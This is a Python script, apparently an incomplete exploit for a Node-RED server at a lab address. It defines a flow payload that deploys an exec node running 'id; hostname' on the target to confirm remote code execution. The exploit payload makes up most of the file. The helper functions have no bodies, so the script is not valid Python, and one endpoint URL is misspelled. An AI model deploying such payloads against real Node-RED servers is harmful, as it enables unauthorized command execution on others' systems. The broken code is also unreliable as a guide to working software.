import argparse
import json
import subprocess
import sys

ERROR = '\033[91m [!!!]\033[0m'
WARNING = '\033[93m [*]\033[0m'
NOTIFICATION = '\033[96m[+]\033[0m'
COLOUR_END = '\033[0m'
UNDERLINE = '\033[4m'

try:
    import requests
except ImportError:
    sys.exit(f"{ERROR} Request unavailable. Try: pip install requests")

targetHost = "10.10.10.40"
flowsURL = f"http://{targetHost}:1880/flows"
settingsURL = f"http://{targetHost}:1880/settinbgs"
piUser = "eh_pi"
nodeConfirm_File = "RCEnodeConfirm.txt"

flowPayload = [
    {
        "id": "nodeTab",
        "type": "tab",
        "label": "Remote Code Execution",
        "disabled": False,
    },
    {
        "id": "nodeInjection",
        "type": "inject",
        "z": "nodeTab",
        "name": "fireOnce_Inject",
        "once": True,
        "onceDelay": 0.1, 
        "topic":"",
        "payload":"",
        "payloadType": "date",
        "wires": [["flowDeploy_exec"]]
    },
    {
        "id": "flowDeploy_exec",
        "type": "exec",
        "z": "nodeTab",
        "name": "confirmRCE",
        "command": (
            f"id; hostname; "
            f"echo {nodeConfirm_File}"
        ),
        "addpay": False,
        "append":"",
        "useSpawn": "false",
        "timer":"",
        "winHide": False,
        "oldrc": False,
        "wires": [[], [], []]
    }
]

def authCheck():
    

def deployFlow():


def RCEverify():


def main():